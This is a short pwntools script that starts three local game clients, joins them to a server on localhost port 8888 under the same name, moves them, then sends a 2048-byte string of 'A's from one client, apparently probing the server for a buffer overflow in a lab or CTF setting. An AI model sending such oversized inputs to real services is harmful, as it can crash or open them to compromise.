
from pwn import *

context.log_level = "debug"

p1 = process("game_client")
p1.sendlineafter(b"\n> ", b"connect localhost 8888")
p1.sendlineafter(b"pseudo> ", b"Jack")
p1.sendlineafter(b"> ", b"$play")

p2 = process("game_client")
p2.sendlineafter(b"\n> ", b"connect localhost 8888")
p2.sendlineafter(b"pseudo> ", b"Jack")
p2.sendlineafter(b"> ", b"$play")

p3 = process("game_client")
p3.sendlineafter(b"\n> ", b"connect localhost 8888")
p3.sendlineafter(b"pseudo> ", b"Jack")
p3.sendlineafter(b"> ", b"$play")

# p4 = process("game_client")
# p4.sendlineafter(b"\n> ", b"connect localhost 8888")
# p4.sendlineafter(b"pseudo> ", b"Jack")
# p4.sendlineafter(b"> ", b"$play")

p3.sendlineafter(b"\n> ", b"$go U")
p2.sendlineafter(b"\n> ", b"$go R")
p1.sendlineafter(b"\n> ", b"$go R")
p1.sendlineafter(b"\n> ", b"A"*2048)
p1.interactive()

# p4.interactive()


